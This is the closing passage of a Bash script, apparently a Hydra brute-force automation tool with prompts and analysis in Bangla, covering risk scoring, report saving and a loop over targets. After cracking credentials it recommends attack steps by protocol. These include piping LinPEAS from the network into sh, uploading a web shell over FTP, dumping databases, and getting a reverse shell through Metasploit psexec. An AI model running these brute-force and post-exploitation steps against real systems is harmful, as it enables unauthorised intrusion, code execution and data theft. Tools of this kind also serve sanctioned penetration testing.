    if ! grep -qi "\[.*\].*login:\|valid password" "$outfile" 2>/dev/null; then
        info=$((info+1))
        echo -e "  ${GREEN}${BOLD}✅ কোনো valid credential পাওয়া যায়নি।${NC}"
        echo -e "     ${WHITE}→ এই wordlist এ কাজ হয়নি।${NC}"
        echo -e "     ${WHITE}→ বড় wordlist বা custom wordlist দিয়ে আবার চেষ্টা করুন।${NC}"
        echo -e "     ${GREEN}→ ঝুঁকি: LOW${NC}"; echo ""
    fi

    # Summary
    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo -e "  ${WHITE}   Info/Low : $info টি${NC}"
    echo ""
    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — System compromised!${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — Lockout বা rate limit আছে।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — এই wordlist এ কাজ হয়নি।${NC}"
    fi
    echo ""
    } | tee "$report_file"
}

# ================================================================
# NEXT TOOL SUGGESTION
# ================================================================
suggest_next_tool() {
    local outfile=$1
    local protocol=$2

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Scan এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qi "\[.*\].*login:\|valid password" "$outfile" 2>/dev/null; then

        case $protocol in
            ssh)
                echo -e "  ${RED}${BOLD}🖥️  SSH Login & Escalation${NC}"
                echo -e "     ${WHITE}কারণ: Valid SSH credential পাওয়া গেছে।${NC}"
                echo -e "     ${CYAN}কমান্ড: ssh user@target${NC}"; echo ""
                echo -e "  ${YELLOW}${BOLD}⚡ LinPEAS${NC} — Linux Privilege Escalation"
                echo -e "     ${WHITE}কারণ: Login এর পর root এ যাওয়ার চেষ্টা করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh${NC}"; echo ""
                ;;
            ftp)
                echo -e "  ${GREEN}${BOLD}📂 FTP Shell Upload${NC}"
                echo -e "     ${WHITE}কারণ: FTP access পাওয়া গেছে — web shell upload করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: ftp target → put webshell.php${NC}"; echo ""
                ;;
            http-post-form|https-post-form)
                echo -e "  ${YELLOW}${BOLD}🌐 Burp Suite${NC} — Post-Login Exploitation"
                echo -e "     ${WHITE}কারণ: Web login হয়েছে — admin panel explore করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: burpsuite (logged-in session intercept করুন)${NC}"; echo ""
                echo -e "  ${RED}${BOLD}💉 SQLmap${NC} — Authenticated SQLi Test"
                echo -e "     ${WHITE}কারণ: Login এর পর authenticated endpoint এ SQLi test করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: sqlmap -u \"http://target/admin/page?id=1\" --cookie=\"session=...\" --dbs${NC}"; echo ""
                ;;
            mysql)
                echo -e "  ${RED}${BOLD}🗄️  MySQL Data Extraction${NC}"
                echo -e "     ${WHITE}কারণ: DB access আছে — সব data বের করুন।${NC}"
                echo -e "     ${CYAN}কমান্ড: mysql -u root -p -h target → show databases;${NC}"; echo ""
                ;;
            rdp)
                echo -e "  ${WHITE}${BOLD}🖥️  RDP Connection${NC}"
                echo -e "     ${WHITE}কারণ: Windows RDP access পাওয়া গেছে।${NC}"
                echo -e "     ${CYAN}কমান্ড: xfreerdp /u:user /p:pass /v:target${NC}"; echo ""
                ;;
            smb)
                echo -e "  ${MAGENTA}${BOLD}📁 SMB Share Access${NC}"
                echo -e "     ${WHITE}কারণ: SMB credentials পাওয়া গেছে।${NC}"
                echo -e "     ${CYAN}কমান্ড: smbclient //target/share -U user%pass${NC}"; echo ""
                echo -e "  ${RED}${BOLD}💀 Metasploit${NC} — SMB Shell"
                echo -e "     ${WHITE}কারণ: SMB দিয়ে reverse shell নেওয়া সম্ভব।${NC}"
                echo -e "     ${CYAN}কমান্ড: msfconsole → use exploit/windows/smb/psexec${NC}"; echo ""
                ;;
        esac
    else
        echo -e "  ${YELLOW}${BOLD}📋 CeWL${NC} — Custom Wordlist Generator"
        echo -e "     ${WHITE}কারণ: Common wordlist কাজ করেনি — target specific wordlist বানান।${NC}"
        echo -e "     ${CYAN}কমান্ড: cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt${NC}"; echo ""

        echo -e "  ${GREEN}${BOLD}🔍 Username Enumeration${NC}"
        echo -e "     ${WHITE}কারণ: হয়তো username ভুল — আগে username enumerate করুন।${NC}"
        echo -e "     ${CYAN}কমান্ড: (WPScan এ -e u অথবা OSINT দিয়ে)${NC}"; echo ""
    fi

    echo -e "  ${WHITE}${BOLD}🔒 SSLScan${NC} — Next in the workflow"
    echo -e "     ${WHITE}কারণ: Brute force এর পর SSL/TLS check করুন।${NC}"
    echo -e "     ${CYAN}কমান্ড: sslscan target.com${NC}"; echo ""
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local scan_out=$1
    local bangla_out=$2
    local out_file=$3
    local target=$4

    echo ""
    echo -e "${GREEN}[✓] Hydra output automatically save হয়েছে: $out_file${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"[?] বাংলা analysis সহ full report save করবেন? (y/n): "${NC})" sc
    if [[ "$sc" =~ ^[Yy]$ ]]; then
        local report_file="${out_file%.txt}_bangla_report.txt"
        {
            echo "============================================================"
            echo "  HYDRA RESULTS  —  SAIMUM's Brute Force Automation Tool"
            echo "  Target   : $target"
            echo "  Protocol : $PROTOCOL"
            echo "  Date     : $(date)"
            echo "============================================================"
            echo ""
            echo "=== HYDRA RAW OUTPUT ==="
            cat "$scan_out"
            echo ""
            echo "=== BANGLA ANALYSIS ==="
            sed 's/\x1b\[[0-9;]*m//g' "$bangla_out"
        } > "$report_file"
        echo -e "${GREEN}[✓] Full report saved → $report_file${NC}"
        echo "$(date) | $PROTOCOL | $target | $report_file" >> "$HISTORY_FILE"
    fi
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    while true; do

        # Step 1 — Targets
        get_targets

        # Step 2 — Protocol
        get_protocol

        # Pre-scan recon
        for t in "${TARGETS[@]}"; do
            pre_scan_recon "$t"
        done

        # Step 3 — Protocol config
        get_proto_config

        # Step 4 — Credentials
        get_credentials

        # Step 5 — Extra options
        get_extra_options

        # Run for each target
        for t in "${TARGETS[@]}"; do
            echo ""
            echo -e "${RED}${BOLD}══════════════ Target: $t ══════════════${NC}"
            build_and_run "$t"
        done

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি attack করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        show_banner
    done
}

main
